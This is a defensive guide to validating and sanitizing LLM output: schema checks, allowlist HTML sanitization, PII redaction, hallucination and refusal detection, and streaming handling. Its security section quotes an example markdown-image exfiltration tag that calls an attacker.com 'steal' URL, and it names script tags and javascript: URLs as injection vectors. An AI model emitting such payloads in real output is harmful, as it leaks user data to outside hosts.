# Skill: Secure Output Handling and Safe Rendering

## Purpose
Validate, sanitize, and safely render LLM-generated content before it reaches users — applying format validation, HTML/JS injection prevention, content safety checks, hallucination detection, and PII leakage prevention through a configurable output pipeline.

## When To Use
- Applications that display LLM output to end users (always)
- Systems where LLM output is rendered as HTML, markdown, or rich text
- Code generation tools where LLM output may contain malicious or buggy code
- Applications where LLM output is stored and later retrieved (validation at write time)
- Systems where LLM output controls UI behavior (dynamic content, commands)

## When NOT To Use
- Internal monitoring or debugging tools where output is only seen by developers
- Systems where LLM output is reviewed by a human before publication
- LLM-to-LLM communication where both ends are controlled (still apply format validation)

## Prerequisites
- KU-06 (Secure Output Handling) — understanding of output injection vectors
- KU-02 (Content Moderation & Safety Filtering) — content safety for outputs
- KU-04 (Data Privacy & PII Protection) — PII leakage detection
- HTML sanitizer library (HTML Purifier for PHP, DOMPurify for JS)
- JSON Schema validation library
- Grounding source (knowledge base) for hallucination detection

## Inputs
- LLM response text to be validated and sanitized
- Expected output format and schema
- Rendering context (HTML, markdown, JSON, plain text, code)
- PII detection patterns (for leakage check)
- Grounding source (knowledge base, RAG context for hallucination check)
- User segment and sensitivity level

## Workflow
1. **Validate format first**: Check that the LLM response matches the expected format. Parse JSON, validate against schema. Check markdown structure. Ensure the output is parseable before inspecting content.
2. **Check content safety**: Run output through the same moderation pipeline as input (ku-02). Detect harmful content (hate, violence, self-harm, sexual) that the model may have generated. Block or flag based on policy.
3. **Check for PII leakage**: Apply PII detection patterns to the output. If the model regurgitated PII from training data or context, redact it before returning to the user.
4. **Sanitize for rendering context**: Apply format-specific sanitization:
   - HTML output: strip dangerous tags and attributes (allowlist approach). Remove event handlers, javascript: URLs, onerror attributes.
   - Markdown output: strip javascript: URLs from links, disable raw HTML if not needed, remove embedded images from untrusted sources.
   - JSON output: validate against schema, strip unexpected fields.
   - Code output: never execute directly. Wrap in code blocks for display only.
5. **Detect hallucinations (high-stakes only)**: For domain-specific outputs (medical, legal, financial), extract claims and verify against a trusted knowledge base using semantic similarity. Flag unverifiable claims.
6. **Detect refusal patterns**: Check if the output contains refusal text ("I cannot", "I'm sorry, but", "As an AI") disguised as normal content. If detected, return a consistent application-level error.
7. **Streaming output handling**: For streaming responses, apply per-chunk sanitization where possible. Buffer 2-3 chunks for context-aware detection (harmful content may span chunks). Apply HTML escaping per-chunk.
8. **Log output validation failures**: Log every validation failure (format, safety, PII, hallucination) with the output content (redacted) and action taken. Alert on increasing failure rates.
9. **Implement safe rendering**: Never render raw LLM output without sanitization. Use template engines with auto-escaping (Blade). Set Content-Security-Policy headers to prevent inline script execution.

## Validation Checklist
- [ ] LLM output is never rendered as raw HTML without sanitization
- [ ] Output format is validated against a schema before returning to the client
- [ ] HTML output is sanitized with an allowlist approach (strip unknown tags/attributes)
- [ ] Streaming output is sanitized per-chunk or with minimal buffering
- [ ] Content safety check is applied to LLM output (same as input moderation)
- [ ] PII leakage detection catches data that shouldn't be in the output
- [ ] Output validation failures are logged and alerted

## Common Failures
- **Raw HTML rendering without sanitization**: LLM output including `<script>` tags executed in user browser. Fix: always sanitize HTML output with allowlist approach.
- **Client-side-only sanitization**: Server trusts client to sanitize, but client can be bypassed. Fix: always sanitize on the server before sending to client.
- **No format validation for structured output**: JSON parse errors crash the application. Fix: validate schema before passing to consuming code.
- **Not handling streaming output differently**: Sanitization only applied to complete responses, not streamed chunks. Fix: implement per-chunk sanitization for streaming.
- **Assuming aligned model is safe**: Model alignment prevents most harmful content but is not a security control. Fix: always validate output regardless of model trust level.

## Decision Points
- **Allowlist vs. blocklist sanitization**: Allowlist (define what's allowed, strip everything else) is more secure. Blocklist (define what's blocked, allow everything else) is easier but less secure. Use allowlist for HTML tags and attributes.
- **Per-chunk vs. buffered for streaming**: Per-chunk for simple sanitization (HTML escaping, PII redaction). Buffered (2-3 chunks) for context-aware detection (harmful content spanning chunks, complete PII patterns).
- **Hallucination detection: always vs. high-stakes only**: Always for domain-specific apps (medical, legal, financial — where wrong answers cause harm). High-stakes only for creative or general-purpose apps (cost of detection exceeds risk).

## Performance Considerations
- Format validation (JSON schema): <0.5ms for small payloads
- HTML sanitization: 1-5ms depending on content length
- PII leakage detection: <1ms (regex-based)
- Hallucination detection (LLM-based): 500ms+ and additional cost — use only for high-stakes
- Per-chunk streaming sanitization: sub-millisecond per chunk
- Cache validation results: same output for different users only needs one validation

## Security Considerations
- HTML/JS injection is the most common LLM output vulnerability — always sanitize HTML
- Markdown injection can exfiltrate data via embedded images (`<img src="https://attacker.com/steal?data=">`) or links with javascript: URLs
- If LLM output is used in shell commands, SQL queries, or eval(), strict validation and parameterization are essential
- Validate all generated URLs against an allowlist to prevent SSRF
- Server-side sanitization is mandatory — never trust client-side only
- Output validation failures may indicate prompt injection, model issues, or data corruption

## Related Rules
- Never pass raw LLM output to the user — always validate through an output guard
- Always implement a "refusal detection" guard that catches model refusals disguised as responses
- Implement factual consistency checking against the knowledge base for domain-specific outputs

## Related Skills
- Skill: Prevent Prompt Injection Attacks (ku-01)
- Skill: Implement Content Moderation and Safety Filtering (ku-02)
- Skill: Protect PII and Data Privacy (ku-04)

## Success Criteria
- Zero raw HTML/JS injection in LLM output rendered to users (server-side sanitization verified)
- >99% of harmful LLM outputs caught by content safety check
- PII leakage detection catches and redacts PII in LLM responses before delivery
- Format validation prevents malformed outputs from reaching consuming code
- Refusal detection identifies and handles model refusals gracefully
- Streaming output is sanitized in real-time without blocking user experience
- Hallucination detection (for high-stakes outputs) flags unverifiable claims before they reach users